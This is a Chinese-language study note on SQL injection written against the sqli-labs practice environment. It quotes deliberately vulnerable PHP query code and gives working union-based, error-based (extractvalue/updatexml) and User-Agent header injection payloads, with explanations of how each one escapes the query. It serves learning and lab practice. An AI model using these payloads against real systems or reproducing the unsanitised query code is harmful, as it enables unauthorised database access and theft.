本文旨在记录笔者学习SQL注入的技术细节。
##### 情景1，报错注入
基础学习环境下，都是将都是将查询语句查询结果显示到前端界面。通常都是只能显示一行。
```
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
$result=mysqli_query($con1, $sql);
$row = mysqli_fetch_array($result, MYSQLI_BOTH);

	if($row)
	{
  	echo "<font size='5' color= '#99FF00'>";
  	echo 'Your Login name:'. $row['username'];
  	echo "<br>";
  	echo 'Your Password:' .$row['password'];
  	echo "</font>";
  	}
	else 
	{
	echo '<font color= "#FFFF00">';
	print_r(mysqli_error($con1));  //可以使用报错注入的关键点
	echo "</font>";  
	}
}
	else { echo "Please input the ID as parameter with numeric value";}

```

这里php把查询的结果放入元组中，结果只能显示username键名的在数据表中的值。我们通常采用union联合注入，两张表的值进行拼接。我们将id传入一个不存在的值，这里是传’-1‘。让第一张表返回空，从而显示第二张表的数据。这里注意使用--注释符时，必须留有空格。
`-1’ union select 1,2,3 from information_schema.tables where table_schema='security'-- -`

但是如果没有这个前端显示处，我们可以通过updatexml和extractvalue这两个函数报错，构造回显。
```
admin' or extractvalue(1,concat(0x7e,database())#
//0x7e为~的十六进制，这里在xpath路径中放入~，会触发错误，从而执行database()代码

?id=1' and updatexml(1,0x7e,1)-- -
//这里依旧是在xpath路径处传入~，触发错误
```
如果说没有`print_r(mysqli_error($con1));`这样显示sql错误的代码。那我们考虑使用Blind或者是时间盲注。

##### 情景2，盲注
 由于盲注技巧配合脚本自动化执行，效果最佳。笔者目前对于python了解甚少，有朝一日，一定补充。

##### 注入payload突破理解
###### sqli-lab 第18,19,20,21关
```
$uname = check_input($con1, $_POST['uname']);
$passwd = check_input($con1, $_POST['passwd']);
$uagent = $_SERVER['HTTP_USER_AGENT'];
$insert="INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)";//这里的uagent是注入点
```
构造payload
```
 ' and extractvalue(1,concat(0x7e,database())) and'
 
 /*这里先通过''来闭合语句的单引号，从而使注入语句不报解析错误。此时'$uagent'位置上为"'' and and extractvalue(1,concat(0x7e,database())) and''"。这里是or还是and无所谓，重要的是，这个插入语句会把这整块当作求值运行，''为假，下面看这个extractvalue函数的值，结果触发异常，执行我们的sql命令*/
 
  ' or extractvalue(1,concat(0x7e,database())),1,1)#
  /*原理也是这样，不过，如果采用注释的话，就要补充注释掉值，否则不符合insert语句执行的规范*/
```
